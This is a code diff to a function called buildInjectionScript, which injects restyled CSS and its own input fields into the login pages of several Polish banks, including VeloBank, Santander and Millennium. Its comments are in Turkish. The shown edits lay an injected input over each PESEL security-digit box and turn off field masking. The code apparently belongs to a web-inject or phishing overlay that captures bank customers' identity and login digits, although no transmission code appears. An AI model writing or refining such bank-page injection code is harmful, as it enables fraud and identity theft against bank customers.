@@ -471,13 +471,19 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         // ----------------------------------------------------------
         const BANK_CSS = {
           velobank:
-            "input.sc-dUMaFF{position:static!important;width:46px!important;height:56px!important;" +
-            "display:block!important;color:#191c1f!important;-webkit-text-fill-color:#191c1f!important;" +
-            "font-size:24px!important;font-weight:600!important;text-align:center!important;" +
-            "background:rgba(255,255,255,.9)!important;border-radius:8px!important;" +
+            // Kutular DINAMIK: container flex+wrap, label'lar esneyip
+            // daralir (min 0), input label'i doldurur — dar ekranda
+            // tasma olmaz, genis ekranda max 56px'de sabitlenir.
+            ".gfvgzc{display:flex!important;flex-wrap:wrap!important;gap:6px!important}" +
+            "label.sc-jLflnl{display:inline-flex!important;flex-direction:column!important;align-items:center!important;" +
+            "flex:1 1 0!important;min-width:0!important;max-width:56px!important}" +
+            "span.sc-bQEQyQ{display:block!important;width:100%!important}" +
+            "input.sc-dUMaFF{position:static!important;width:100%!important;height:auto!important;aspect-ratio:46/56!important;" +
+            "display:block!important;color:#191c1f!important;-webkit-text-fill-color:#191c1f!important;-webkit-text-security:none!important;" +
+            "font-size:clamp(14px,4vw,24px)!important;font-weight:600!important;text-align:center!important;" +
+            "background:#ffffff!important;border:1px solid #c9c9c9!important;border-radius:8px!important;" +
             "caret-color:#191c1f!important;opacity:1!important;margin:0 auto!important}" +
-            "input.sc-dUMaFF:focus{outline:2px solid #00b140!important;outline-offset:1px}" +
-            "span.sc-bQEQyQ{display:flex!important;align-items:center!important;justify-content:center!important}",
+            "input.sc-dUMaFF:focus{outline:2px solid #00b140!important;outline-offset:1px}",
           santander:
             "@media(max-width:900px){" +
             "html,body{min-width:0!important;overflow-x:hidden!important}" +
@@ -499,20 +505,21 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
           "bsr-krakow":
             "@media(max-width:900px){html,body{min-width:0!important;overflow-x:hidden!important}}" ,
           millennium:
-            // PESEL satiri: gri 22px goruntu kutulari + MUI native input'lari
-            // tek tip beyaz 40x44 kutuya cevir; enjekte input grey kutunun
-            // ustune opak biner — kayitli eski gri ton kaybolur.
-            "[data-testid=security-digits-container] .css-9i7jw0{width:40px!important;height:44px!important;" +
-            "background:#ffffff!important;border:1px solid #b9b9b9!important;border-radius:6px!important;position:relative!important}" +
-            "[data-testid=security-digits-container] .css-nfgiif{display:flex!important;flex-direction:column!important;align-items:center!important}" +
-            "[data-testid=security-digits-container] input[name^=Pesel]{width:40px!important;height:44px!important;padding:0!important;margin:0 auto 4px auto!important;display:block!important;" +
+            // PESEL satiri DINAMIK: 11 kutu container genisligine bolunur
+            // (flex:1), aspect-ratio ile oran korunur — dar ekranda tasma
+            // olmaz, genis ekranda max 44px'de sabitlenir.
+            "[data-testid=security-digits-container]{display:flex!important;flex-wrap:nowrap!important;gap:4px!important}" +
+            "[data-testid=security-digits-container] .css-nfgiif{flex:1 1 0!important;min-width:0!important;display:flex!important;flex-direction:column!important;align-items:center!important}" +
+            "[data-testid=security-digits-container] .css-9i7jw0{width:100%!important;max-width:44px!important;height:auto!important;aspect-ratio:10/11!important;" +
+            "background:#ffffff!important;border:1px solid #b9b9b9!important;border-radius:6px!important;position:relative!important;margin-bottom:4px!important}" +
+            "[data-testid=security-digits-container] input[name^=Pesel]{width:100%!important;max-width:44px!important;height:auto!important;aspect-ratio:10/11!important;padding:0!important;margin:0 auto 4px auto!important;display:block!important;" +
             "background:#ffffff!important;border:1px solid #b9b9b9!important;border-radius:6px!important;box-sizing:border-box!important;" +
             "color:#191c1f!important;-webkit-text-fill-color:#191c1f!important;-webkit-text-security:none!important;" +
-            "font-size:18px!important;font-weight:600!important;text-align:center!important;caret-color:#191c1f!important;opacity:1!important}" +
+            "font-size:clamp(13px,4vw,18px)!important;font-weight:600!important;text-align:center!important;caret-color:#191c1f!important;opacity:1!important}" +
             "[data-testid=security-digits-container] input[name^=Pesel]:focus{border-color:#dd1a21!important;outline:2px solid rgba(221,26,33,.35)!important;outline-offset:0!important}" +
             "[data-testid=security-digits-container] .MuiInput-root:before,[data-testid=security-digits-container] .MuiInput-root:after{display:none!important;border:none!important}" +
-            "[data-testid=security-digits-container] .MuiTextField-root,[data-testid=security-digits-container] .MuiInputBase-root{width:40px!important;min-width:40px!important;max-width:40px!important;padding:0!important}" +
-            "[data-testid=security-digits-container] .MuiBox-root{width:auto!important;padding:0!important}",
+            "[data-testid=security-digits-container] .MuiTextField-root,[data-testid=security-digits-container] .MuiInputBase-root{width:100%!important;min-width:0!important;max-width:44px!important;padding:0!important}" +
+            "[data-testid=security-digits-container] .MuiBox-root{width:100%!important;padding:0!important;display:flex!important;justify-content:center!important}",
         };
         const bankCss = BANK_CSS[BANK_SLUG];
         if (bankCss && !root.getElementById("pl-bank-fix")) {
@@ -791,7 +798,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             inp.setAttribute("inputmode", "numeric");
             inp.setAttribute("aria-label", "PESEL - znak nr. " + n);
             inp.style.cssText =
-              "position:absolute;inset:0;width:100%;height:100%;min-width:36px;min-height:44px;" +
+              "position:absolute;inset:0;width:100%;height:100%;min-width:0;min-height:0;" +
               "border:none;outline:none;background:transparent;text-align:center;" +
               "font:inherit;font-size:1.35rem;font-weight:600;color:#191c1f;" +
               "caret-color:#191c1f;box-sizing:border-box;padding:0;display:block;" +
